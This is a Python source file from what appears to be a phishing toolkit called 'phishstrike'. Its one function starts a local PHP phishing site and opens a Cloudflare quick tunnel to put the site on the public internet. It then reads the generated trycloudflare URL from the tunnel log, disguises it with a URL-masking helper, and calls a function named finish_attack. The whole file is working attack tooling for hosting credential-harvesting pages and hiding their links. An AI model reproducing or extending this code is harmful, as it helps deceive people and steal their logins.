import os
import platform
import re
import subprocess

from phishstrike import state
from phishstrike.features.mask import custom_url
from phishstrike.server.php import cusport, setup_site
from phishstrike.tunnel.helpers import finish_attack
from lib.terminal_ui import *


def start_cloudflared() -> None:
    cld_log = os.path.join(state.BASE_DIR, ".server/.cld.log")
    if os.path.exists(cld_log):
        os.remove(cld_log)
    cusport()
    print(
        f"\n{DARK}[{WHITE}-{DARK}]{PURPLE} Initializing... {PURPLE}( "
        f"{LIGHT2}http://{state.HOST}:{state.PORT} {PURPLE})"
    )
    loading_animation(2, "Initializing Server")
    setup_site()
    slow_type(
        "    [+] Initializing Cloudflared Multi-Proxy Tunnel...",
        speed=0.01,
        start_rgb=RGB_WHITE,
        end_rgb=RGB_CYAN,
    )

    cld_bin = os.path.join(
        state.BASE_DIR,
        ".server",
        "cloudflared.exe" if platform.system() == "Windows" else "cloudflared",
    )

    if platform.system() != "Windows" and os.path.exists(cld_bin):
        os.chmod(cld_bin, 0o755)

    with open(cld_log, "w") as log:
        subprocess.Popen(
            [cld_bin, "tunnel", "-url", f"{state.HOST}:{state.PORT}"],
            stdout=log,
            stderr=log,
        )

    loading_animation(8, "Generating Tunnel Link")
    cldflr_url = ""
    if os.path.exists(cld_log):
        with open(cld_log, "r") as f:
            content = f.read()
            match = re.search(r"https://[-0-9a-z]*\.trycloudflare\.com", content)
            if match:
                cldflr_url = match.group(0)

    custom_url(cldflr_url)
    finish_attack()
